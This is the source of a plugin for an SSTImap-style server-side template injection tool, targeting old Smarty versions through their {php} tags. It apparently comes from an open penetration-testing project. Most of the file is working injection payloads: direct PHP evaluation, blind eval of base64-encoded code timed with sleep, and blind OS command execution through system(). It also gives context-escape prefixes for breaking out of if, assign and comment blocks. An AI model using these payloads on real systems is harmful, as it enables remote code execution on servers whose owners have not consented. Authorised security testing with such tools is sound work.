from plugins.languages import php
from utils import rand


class Smarty_unsecure(php.Php):
    generic_plugin = True
    legacy_plugin = True
    priority = 7
    plugin_info = {
        "Description": """Smarty template engine prior to version 3.0 using {php}{/php} tags""",
        "Usage notes": "Functionality completely covered by the new 'Smarty' plugin.",
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
        "Engine": [
            "Homepage: https://www.smarty.net/docs/en/",
            "Github: https://github.com/smarty-php/smarty",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '{{{header[0]}+{header[1]}}}',
                'trailer': '{{{trailer[0]}+{trailer[1]}}}',
                # {php}{/php} added to check for this tag for exploitation, otherwise test regular Smarty payload based on {if}{/if} tag
                'test_render': f"""{{{rand.randints[0]}}}{{php}}{{/php}}{{*{rand.randints[1]}*}}{{{rand.randints[2]}}}""",
                'test_render_expected': f'{rand.randints[0]}{rand.randints[2]}'
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """{{php}}{code}{{/php}}"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """{{php}}$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%4,'=',STR_PAD_RIGHT)) . ") && sleep({delay});");{{/php}}"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """{{php}}$d="{code_b64}";system(base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%4,'=',STR_PAD_RIGHT)). " && sleep {delay}");{{/php}}"""
            },
        })


        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure}}}', 'suffix': '{', 'closures': php.ctx_closures},
            # {config_load file="missing_file"} raises an exception
            # Escape Ifs
            {'level': 5, 'prefix': '{closure}}}{{/if}}{{if 1}}', 'suffix': '', 'closures': php.ctx_closures},
            # Escape {assign var="%s" value="%s"}
            {'level': 5, 'prefix': '{closure} var="" value=""}}{{assign var="" value=""}}', 'suffix': '', 'closures': php.ctx_closures},
            # Comments
            {'level': 5, 'prefix': '*}}', 'suffix': '{*'},
        ])
